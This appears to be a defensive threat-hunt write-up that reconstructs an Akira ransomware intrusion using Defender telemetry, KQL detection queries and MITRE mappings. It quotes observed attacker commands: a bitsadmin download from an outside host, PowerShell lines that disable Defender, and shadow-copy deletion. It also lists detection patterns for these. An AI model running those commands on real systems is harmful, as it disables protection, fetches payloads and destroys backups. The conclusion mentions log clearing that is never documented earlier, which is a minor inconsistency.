# Sentinel Threat Hunt — Akira Ransomware Incident Reconstruction

> All investigation screenshots and artifacts are stored in the `/evidence` directory.

---

# Overview

This investigation reconstructs a **human-operated ransomware intrusion** involving the **Akira ransomware family** using telemetry from **Microsoft Defender for Endpoint** and **Microsoft Sentinel**.

The investigation began with Defender alerts indicating suspicious PowerShell activity that downloaded and executed multiple binaries including:

- `scan.exe`
- `advanced_ip_scanner.exe`
- `wsync.exe`

Further analysis revealed a full attack lifecycle involving:

- internal reconnaissance
- credential access
- lateral movement
- data staging
- ransomware deployment

Two systems were involved:

| System | Role |
|------|------|
AS-PC2 | Initial compromised workstation |
AS-SRV | File server targeted for ransomware |

---

# Investigation Methodology

The investigation followed a standard threat hunting workflow:

1. Review Defender alert telemetry
2. Reconstruct process execution timeline
3. Identify attacker tools
4. Detect lateral movement
5. Identify data staging
6. Confirm ransomware execution

Primary telemetry sources:

- DeviceProcessEvents
- DeviceFileEvents
- DeviceEvents
- DeviceNetworkEvents
- DeviceLogonEvents

---

# Initial Investigation

The investigation began by reconstructing the execution timeline for the compromised user.

### Query

```kql
DeviceProcessEvents
| where DeviceName == "as-pc2"
| where AccountName =~ "david.mitchell"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp
```

This query revealed suspicious binaries including:

- `scan.exe`
- `advanced_ip_scanner.exe`
- `wsync.exe`

---

<details>
<summary>Evidence — Initial Query Results</summary>

![Initial Query Results](evidence/query_initial_results.png)

</details>

---

# Malware Download

The attacker downloaded a scanning utility using **BITSAdmin**, a living-off-the-land binary.

Observed command:

```
bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe
```

MITRE Technique:

```
T1105 — Ingress Tool Transfer
```

---

<details>
<summary>Evidence — Malware Download</summary>

![BITSAdmin Transfer](evidence/bitsadmin_scan_download.png)

</details>

---

# Network Reconnaissance

The attacker executed **Advanced IP Scanner** to identify internal hosts.

Purpose:

- discover reachable systems
- identify lateral movement targets

MITRE Technique:

```
T1046 — Network Service Discovery
```

---

<details>
<summary>Evidence — Network Scanning</summary>

![Advanced IP Scanner](evidence/advanced_ip_scanner.png)

</details>

---

# Command and Control Beacon

A suspicious binary named **wsync.exe** was downloaded and executed from:

```
C:\ProgramData\wsync.exe
```

This executable acted as a **command-and-control beacon**.

---

<details>
<summary>Evidence — Beacon Execution</summary>

![Beacon Execution](evidence/wsync_execution.png)

</details>

---

# Credential Access

Telemetry shows that **LSASS memory was accessed**, indicating potential credential dumping.

MITRE Technique:

```
T1003.001 — LSASS Memory
```

---

<details>
<summary>Evidence — LSASS Access</summary>

![LSASS Access](evidence/lsass_access.png)

</details>

---

# Defense Evasion

The attacker disabled Microsoft Defender protections using PowerShell.

Observed commands:

```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

Registry modification:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
DisableAntiSpyware
```

MITRE Technique:

```
T1562 — Impair Defenses
```

---

<details>
<summary>Evidence — Defender Tampering</summary>

![Defender Tampering](evidence/defender_tampering.png)

![Kill.bat Defender Disable](evidence/defender_tampering_killbat.png)

</details>

---

# Backup Deletion

To prevent recovery, the attacker attempted to delete shadow copies.

Observed command:

```
WMIC shadowcopy delete
```

MITRE Technique:

```
T1490 — Inhibit System Recovery
```

---

<details>
<summary>Evidence — Shadow Copy Deletion</summary>

![Shadow Copy Deleted](evidence/shadowcopy_delete.png)

</details>

---

# Lateral Movement

Logon telemetry revealed multiple failed login attempts followed by a successful login.

This suggests **brute force or credential reuse**.

MITRE Technique:

```
T1110 — Brute Force
```

---

<details>
<summary>Evidence — Login Attempts</summary>

![Login Failures](evidence/brute_force_failures.png)

![Login Success](evidence/brute_force_success.png)

</details>

---

The compromised account successfully authenticated to **AS-SRV**, confirming lateral movement.

MITRE Technique:

```
T1021 — Remote Services
```

---

# Activity on AS-SRV

Once on the server, the attacker executed several tools including:

- AnyDesk
- network enumeration
- archive creation
- ransomware execution

---

<details>
<summary>Evidence — Remote Access Tool</summary>

![AnyDesk Execution](evidence/anydesk_execution_srv.png)

</details>

---

# Data Staging

Files were compressed into an archive prior to encryption.

Archive created:

```
exfil_data.zip
```

MITRE Technique:

```
T1560 — Archive Collected Data
```

---

<details>
<summary>Evidence — Data Archive</summary>

![Exfil Archive](evidence/exfil_archive_creation.png)

</details>

---

# Ransomware Execution

The ransomware payload executed as:

```
updater.exe
```

Encrypted files were identified with the `.akira` extension.

MITRE Technique:

```
T1486 — Data Encrypted for Impact
```

---

<details>
<summary>Evidence — Encrypted Files</summary>

![Akira Encrypted Files](evidence/akira_encrypted_files.png)

</details>

---

<details>
<summary>Evidence — Ransom Note Creation</summary>

![Ransom Note](evidence/ransom_note_created.png)

</details>

---

# Process Lineage Reconstruction

The reconstructed process tree shows the full attack lifecycle.

```
explorer.exe
 └─ cmd.exe
     └─ bitsadmin.exe
         └─ scan.exe
             └─ advanced_ip_scanner.exe
                 └─ wsync.exe
                     └─ powershell.exe
                         ├─ st.exe
                         └─ updater.exe
```

---

# MITRE ATT&CK Mapping

| Stage | Technique |
|------|------|
Initial Access | T1110 — Brute Force |
Discovery | T1046 — Network Discovery |
Credential Access | T1003 — LSASS |
Lateral Movement | T1021 — Remote Services |
Defense Evasion | T1562 — Impair Defenses |
Collection | T1560 — Data Archiving |
Impact | T1486 — Ransomware |

---

# Detection Engineering

The following KQL detections could identify similar activity in the future.

### Detect BITS Malware Downloads

```kql
DeviceProcessEvents
| where FileName == "bitsadmin.exe"
| where ProcessCommandLine contains "http"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

---

### Detect Defender Tampering

```kql
DeviceProcessEvents
| where ProcessCommandLine contains "Set-MpPreference"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

---

### Detect Shadow Copy Deletion

```kql
DeviceProcessEvents
| where ProcessCommandLine contains "shadowcopy"
or ProcessCommandLine contains "vssadmin delete"
```

---

### Detect Credential Dumping Indicators

```kql
DeviceEvents
| where ActionType == "NamedPipeEvent"
| where AdditionalFields contains "lsass"
```

---

### Detect Suspicious Archive Creation

```kql
DeviceFileEvents
| where FileName endswith ".zip"
| where InitiatingProcessFileName != "explorer.exe"
```

---

# Detection Coverage Gap Analysis

During this investigation several attacker behaviors occurred without triggering preventative controls.

The following detection gaps were identified.

---

## Living-off-the-Land Binary Abuse

The attacker used **BITSAdmin** to download malicious tooling.

Observed command:

```
bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe
```

Recommended detection:

```kql
DeviceProcessEvents
| where FileName == "bitsadmin.exe"
| where ProcessCommandLine contains "http"
```

---

## Defender Tampering

Security controls were disabled prior to further attack activity.

Recommended detection:

```kql
DeviceProcessEvents
| where ProcessCommandLine contains "Set-MpPreference"
```

---

## Shadow Copy Deletion

Shadow copies were deleted before ransomware deployment.

Recommended detection:

```kql
DeviceProcessEvents
| where ProcessCommandLine contains "shadowcopy"
or ProcessCommandLine contains "vssadmin delete"
```

---

## Credential Dumping Indicators

LSASS memory access occurred without triggering high-confidence alerts.

Recommended detection:

```kql
DeviceEvents
| where ActionType == "NamedPipeEvent"
| where AdditionalFields contains "lsass"
```

---

# Conclusion

This investigation reconstructed a **human-operated ransomware intrusion** using Microsoft Defender telemetry and Sentinel queries.

The attacker:

1. gained access via compromised credentials  
2. conducted reconnaissance using Advanced IP Scanner  
3. downloaded tooling via BITSAdmin  
4. deployed a command-and-control beacon (`wsync.exe`)  
5. disabled Microsoft Defender protections  
6. accessed LSASS memory for credential harvesting  
7. pivoted laterally to AS-SRV  
8. staged data for exfiltration  
9. cleared system logs  
10. deployed Akira ransomware

This investigation demonstrates how **endpoint telemetry and proactive threat hunting techniques can reconstruct attacker behavior and inform defensive improvements.**
